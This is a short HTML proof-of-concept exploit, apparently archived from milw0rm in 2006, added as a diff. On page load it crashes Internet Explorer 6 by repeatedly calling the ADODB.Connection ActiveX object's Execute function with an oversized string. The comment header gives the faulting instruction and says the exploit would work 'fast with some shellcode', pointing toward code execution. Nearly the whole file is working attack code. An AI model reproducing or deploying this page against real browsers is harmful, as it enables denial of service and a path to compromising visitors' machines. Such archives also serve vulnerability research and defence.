@@ -1,0 +1,31 @@
+<!--
+// Internet Explorer 'ADODB.Connection' object 'Execute' Function Vulnerability POC
+// tested on Windows XP SP1/XP SP2, IE 6.0 with latest patches installed
+// Author: YAG KOHHA (skyhole [at] gmail.com)
+// Greetz: H D Moor, Dark Eagle, str0ke, Maxus, Fuchunic, Offtopic
+
+// Access violation at:
+// ----------------------------------------------------
+// 77114D0F   66:8B75 00       MOV SI,WORD PTR SS:[EBP]
+// ----------------------------------------------------
+// P.S. It`s will be fast with some shellcode :P
+--!>
+
+<html>
+<head>
+<title>ADODB.Connection.Execute CRASH TEST</title>
+</head>
+<script>
+function Bang_Bang() {
+var a = new ActiveXObject('ADODB.Connection.2.7');
+var b = 'FUCK';
+while (b.length <= 1024*256) b+=b;
+for (var i = 0; i < 32768; i++)
+try { a.Execute(b,b,b); } catch(e) {}
+}
+</script>
+<body onLoad='Bang_Bang()'>
+<center><h1>WOW!!! Are U live?</h1></center>
+</body></html>
+
+# milw0rm.com [2006-10-24]
